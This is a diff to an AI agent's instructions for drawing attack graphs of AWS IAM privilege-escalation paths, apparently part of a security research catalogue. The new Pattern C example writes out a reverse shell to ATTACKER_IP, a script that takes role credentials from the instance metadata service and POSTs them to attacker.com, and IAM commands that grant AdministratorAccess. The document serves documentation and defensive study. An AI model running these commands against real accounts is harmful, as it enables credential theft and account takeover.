@@ -15,14 +15,17 @@ You are a specialized agent for adding `attackVisualization` sections to AWS IAM
 
 Add a structured `attackVisualization` section to privilege escalation path YAML files that don't currently have one. The visualization creates an interactive graph showing the attack flow from starting principal to outcomes.
 
-**IMPORTANT:** If the target YAML file already has an `attackVisualization` section, skip this file and report that visualization already exists. Do not modify or replace existing visualizations.
+**IMPORTANT:** If the target YAML file already has an `attackVisualization` section, review the attack path that exists against the guidance within this agent and update the attack path so that it conforms with the current standard. 
 
 ## Required Reading
 
 Before creating any visualization:
 1. Read the target YAML file completely to understand the attack path
 2. Read the `attackVisualization` section in SCHEMA.md for complete format and rules
-3. Review existing visualizations in `data/paths/bedrock/bedrock-001.yaml` and `data/paths/apprunner/apprunner-001.yaml` as reference examples
+3. Review existing visualizations as reference examples based on the attack pattern:
+   - **Pattern A (self-escalation)**: `data/paths/iam/iam-001.yaml`
+   - **Pattern B (lateral movement)**: `data/paths/sts/sts-001.yaml`
+   - **Pattern C (PassRole workload with multiple methods)**: `data/paths/apprunner/apprunner-001.yaml` and `data/paths/ec2/ec2-001.yaml`
 4. Check if a matching scenario exists in `/Users/seth.art/Documents/projects/pathfinder-labs/modules/scenarios/single-account/privesc-one-hop/` and use its scenario.yaml file to:
    - Validate your understanding of the attack flow
    - Extract any additional technical details (resource names, command syntax)
@@ -319,6 +322,260 @@ edges:
       meaningful privilege escalation achieved.
 ```
 
+**Pattern C - PassRole-based Workload Control with Multiple Exploitation Methods:**
+```
+starting-principal → workload-resource → target-role → [3 method nodes] → [3x3 outcomes]
+```
+
+**Use Pattern C when:** The attack uses PassRole to create a compute workload (EC2, Lambda, App Runner, CodeBuild, etc.) with a privileged role, and the attacker has multiple ways to leverage the role's credentials.
+
+**Structure:**
+- Node 1: `starting-principal` (type: principal)
+- Node 2: The workload resource (e.g., `New EC2 Instance`, `New Lambda Function`, `New App Runner Service`) (type: resource)
+- Node 3: The target role being passed to the workload (e.g., `Existing Role That Trusts the EC2 Service`) (type: resource)
+- Nodes 4-6: Three method/payload nodes representing different exploitation approaches (type: action, color: `#99ccff`)
+  - Method 1: Direct elevation approach (e.g., User Data script that modifies IAM)
+  - Method 2: Interactive access approach (e.g., Reverse shell)
+  - Method 3: Credential exfiltration approach (e.g., Send credentials to webhook)
+- Nodes 7-9: Three outcome nodes based on target role's permissions:
+  - Admin outcome: "Effective Administrator" (type: outcome, green/default)
+  - Partial outcome: "Check for Additional Access" (type: outcome, yellow `#ffeb99`)
+  - Minimal outcome: "Minimal Additional Access" (type: outcome, gray `#cccccc`)
+
+**Edges:**
+- Transitive edge (solid): starting-principal → workload-resource (label: the permissions, e.g., "iam:PassRole + ec2:RunInstances")
+  - Include relevant AWS CLI command in description
+- Transitive edge (solid): workload-resource → target-role (label: how role is assumed, e.g., "Instance assumes role")
+- Conditional edges (dashed): target-role → each method node
+  - Branch A: target-role → method_1 (label: "Option A")
+  - Branch B: target-role → method_2 (label: "Option B")
+  - Branch C: target-role → method_3 (label: "Option C")
+  - **Note:** These use branch labels but NO condition field (they're choices, not environmental conditions)
+- Conditional edges (dashed): Each method → all 3 outcomes (3x3 = 9 edges total)
+  - method_1 → admin (branch: A1, condition: admin)
+  - method_1 → some_perms (branch: A2, condition: some_permissions)
+  - method_1 → no_access (branch: A3, condition: no_permissions)
+  - method_2 → admin (branch: B1, condition: admin)
+  - method_2 → some_perms (branch: B2, condition: some_permissions)
+  - method_2 → no_access (branch: B3, condition: no_permissions)
+  - method_3 → admin (branch: C1, condition: admin)
+  - method_3 → some_perms (branch: C2, condition: some_permissions)
+  - method_3 → no_access (branch: C3, condition: no_permissions)
+
+**Example (EC2 with User Data):**
+```yaml
+nodes:
+  - id: start
+    label: Starting Principal
+    type: principal
+    description: |
+      The principal with iam:PassRole and ec2:RunInstances permissions. Can be an IAM user or role.
+
+  - id: ec2_instance
+    label: New EC2 Instance
+    type: resource
+    description: |
+      New EC2 instance launched with a privileged IAM instance profile attached. The instance automatically assumes the attached role, making credentials available via the instance metadata service. The attacker can access the instance through User Data scripts, Systems Manager (SSM), or SSH.
+
+  - id: target_role
+    label: Existing Role That Trusts the EC2 Service
+    type: resource
+    description: |
+      IAM role attached to the EC2 instance via instance profile. The role must trust ec2.amazonaws.com and have an instance profile associated. The role's temporary credentials are accessible via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/.
+
+  - id: method_direct
+    label: "Method 1: User Data Script (Direct Elevation)"
+    type: action
+    color: '#99ccff'
+    description: |
+      Configure a User Data script that executes on instance boot and directly modifies IAM to elevate the starting principal. The script uses the target role's credentials to perform actions like:
+      - Attach AdministratorAccess policy to starting principal: `aws iam attach-user-policy --user-name USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`
+      - Create new access keys for starting principal: `aws iam create-access-key --user-name USERNAME`
+      - Add starting principal to admin group: `aws iam add-user-to-group --user-name USERNAME --group-name Admins`
+
+      This is the most straightforward approach but requires the target role to have IAM write permissions.
+
+  - id: method_reverse_shell
+    label: "Method 2: User Data Script (Reverse Shell)"
+    type: action
+    color: '#99ccff'
+    description: |
+      Configure a User Data script that establishes a reverse shell connection to an attacker-controlled server. The script runs on instance boot and provides interactive command-line access with the target role's credentials.
+
+      Example User Data script:
+      ```bash
+      #!/bin/bash
+      bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+      ```
+
+      The attacker maintains a listener (e.g., `nc -lvnp 4444`) to catch the connection. Once connected, they can use AWS CLI commands with the instance's role credentials, which are automatically available via the metadata service.
+
+  - id: method_exfiltration
+    label: "Method 3: User Data Script (Credential Exfiltration)"
+    type: action
+    color: '#99ccff'
+    description: |
+      Configure a User Data script that retrieves the target role's temporary credentials from the metadata service and exfiltrates them to an attacker-controlled webhook or remote server.
+
+      Example User Data script:
+      ```bash
+      #!/bin/bash
+      ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+      CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)
+      curl -X POST https://attacker.com/exfil -d "$CREDS"
+      ```
+
+      This is a "fire-and-forget" approach that doesn't require maintaining a reverse shell connection. The attacker can then use the exfiltrated credentials from their own environment.
+
+  - id: admin
+    label: Effective Administrator
+    type: outcome
+    description: |
+      The target role has AdministratorAccess or equivalent permissions. Using any of the three exploitation methods, the attacker successfully leverages these permissions to gain full administrative access to the AWS account.
+
+  - id: some_perms
+    label: Check for Additional Access
+    type: outcome
+    color: '#ffeb99'
+    description: |
+      The target role has some elevated permissions but not full admin access. Using any of the three exploitation methods, the attacker can leverage these permissions for data exfiltration, security configuration changes, or additional privilege escalation paths.
+
+  - id: no_access
+    label: Minimal Additional Access
+    type: outcome
+    color: '#cccccc'
+    description: |
+      The target role only has minimal permissions (like logs:PutLogEvents). Regardless of the exploitation method used, the privilege escalation provides limited value.
+
+edges:
+  - from: start
+    to: ec2_instance
+    label: iam:PassRole + ec2:RunInstances
+    description: |
+      Launch a new EC2 instance and pass the target role to it via the --iam-instance-profile parameter. Include a User Data script in the launch configuration that will execute when the instance boots.
+
+      Command:
+      ```bash
+      aws ec2 run-instances \
+        --image-id ami-12345678 \
+        --instance-type t2.micro \
+        --iam-instance-profile Arn="arn:aws:iam::ACCOUNT_ID:instance-profile/PRIVILEGED_ROLE" \
+        --user-data file://exploit.sh
+      ```
+
+  - from: ec2_instance
+    to: target_role
+    label: Instance assumes role
+    description: |
+      The EC2 instance automatically assumes the attached IAM role when it starts. The role's temporary credentials become available via the instance metadata service at http://169.254.169.254/latest/meta-data/iam/security-credentials/.
+
+  - from: target_role
+    to: method_direct
+    label: Option A
+    branch: A
+    description: |
+      Choose the direct elevation approach: configure the User Data script to use the target role's credentials to directly elevate the starting principal via IAM modifications.
+
+  - from: target_role
+    to: method_reverse_shell
+    label: Option B
+    branch: B
+    description: |
+      Choose the reverse shell approach: configure the User Data script to establish a reverse shell connection, providing interactive access with the target role's credentials.
+
+  - from: target_role
+    to: method_exfiltration
+    label: Option C
+    branch: C
+    description: |
+      Choose the credential exfiltration approach: configure the User Data script to extract and send the target role's credentials to an attacker-controlled endpoint.
+
+  - from: method_direct
+    to: admin
+    label: If target role has admin or IAM write permissions
+    branch: A1
+    condition: admin
+    description: |
+      If the target role has AdministratorAccess or permissions to modify IAM (like iam:AttachUserPolicy, iam:PutUserPolicy, iam:AddUserToGroup, iam:CreateAccessKey), the User Data script successfully elevates the starting principal to administrator.
+
+  - from: method_direct
+    to: some_perms
+    label: If target role has some elevated permissions
+    branch: A2
+    condition: some_permissions
+    description: |
+      If the target role has some elevated permissions but not IAM write access, the User Data script can leverage those permissions for data access or other attacks, but cannot directly elevate the starting principal.
+
+  - from: method_direct
+    to: no_access
+    label: If target role has minimal permissions
+    branch: A3
+    condition: no_permissions
+    description: |
+      If the target role only has minimal permissions, the User Data script cannot effectively escalate privileges or perform useful actions.
+
+  - from: method_reverse_shell
+    to: admin
+    label: If target role has admin permissions
+    branch: B1
+    condition: admin
+    description: |
+      If the target role has AdministratorAccess, the reverse shell provides interactive command-line access with full administrative permissions.
+
+  - from: method_reverse_shell
+    to: some_perms
+    label: If target role has some permissions
+    branch: B2
+    condition: some_permissions
+    description: |
+      If the target role has some elevated permissions, the reverse shell allows the attacker to interactively explore and leverage those permissions for further attacks or data access.
+
+  - from: method_reverse_shell
+    to: no_access
+    label: If target role has minimal permissions
+    branch: B3
+    condition: no_permissions
+    description: |
+      If the target role only has minimal permissions, the reverse shell provides limited value despite offering interactive access.
+
+  - from: method_exfiltration
+    to: admin
+    label: If target role has admin permissions
+    branch: C1
+    condition: admin
+    description: |
+      If the target role has AdministratorAccess, the exfiltrated credentials provide full administrative access that can be used from the attacker's own environment.
+
+  - from: method_exfiltration
+    to: some_perms
+    label: If target role has some permissions
+    branch: C2
+    condition: some_permissions
+    description: |
+      If the target role has some elevated permissions, the exfiltrated credentials can be used for data access, reconnaissance, or additional privilege escalation attempts.
+
+  - from: method_exfiltration
+    to: no_access
+    label: If target role has minimal permissions
+    branch: C3
+    condition: no_permissions
+    description: |
+      If the target role only has minimal permissions, the exfiltrated credentials provide limited value for further attacks.
+```
+
+**When to use Pattern C:**
+- PassRole + {EC2, Lambda, CodeBuild, Glue, AppRunner, SageMaker, etc.} where a compute workload is created
+- The attacker has control over what code/commands execute within the workload
+- Multiple exploitation methods are viable (direct IAM modification, reverse shell, credential exfiltration, etc.)
+- The outcome depends on the target role's permissions
+
+**Common services for Pattern C:**
+- `iam:PassRole + ec2:RunInstances` (User Data, reverse shell, credential exfiltration)
+- `iam:PassRole + lambda:CreateFunction` (Function code, reverse connection, environment variable exfiltration)
+- `iam:PassRole + apprunner:CreateService` (StartCommand, web shell, apprunner.yaml)
+- `iam:PassRole + codebuild:StartBuild` (buildspec.yml commands, reverse shell, credential exfiltration)
+- `iam:PassRole + glue:CreateJob` (Script content, connection strings)
+
 ## Critical Anti-Patterns to Avoid
 
 ### ❌ WRONG: Unnecessary intermediate action nodes
@@ -356,7 +613,7 @@ edges:
 **Keep it minimal:** Target 3-7 nodes for most paths
 - **Simple self-escalation (Pattern A):** 2 nodes (start → outcome)
 - **Simple lateral movement (Pattern B):** 5 nodes (start → target → 3 outcomes)
-- **PassRole-based paths:** 5-7 nodes (start → resource → role/action → outcomes)
+- **PassRole-based workload control (Pattern C):** 9 nodes (start → workload → role → 3 methods → 3 outcomes)
 - **Complex multi-approach:** 8-12 nodes maximum
 
 **When to create intermediate nodes:**
@@ -438,8 +695,11 @@ After creating the visualization:
 ## Example Reference
 
 Study these examples before creating visualizations:
-- **Simple with branching**: data/paths/sts/sts-001.yaml
-- **Complex multi-approach**: data/paths/ec2/ec2-001.yaml
+- **Pattern A (Simple self-escalation)**: data/paths/iam/iam-001.yaml (iam:CreatePolicyVersion)
+- **Pattern B (Simple lateral movement)**: data/paths/sts/sts-001.yaml (sts:AssumeRole)
+- **Pattern C (PassRole workload control with multiple methods)**:
+  - data/paths/ec2/ec2-001.yaml (iam:PassRole + ec2:RunInstances)
+  - data/paths/apprunner/apprunner-001.yaml (iam:PassRole + apprunner:CreateService)
 
 ## Important Notes
 
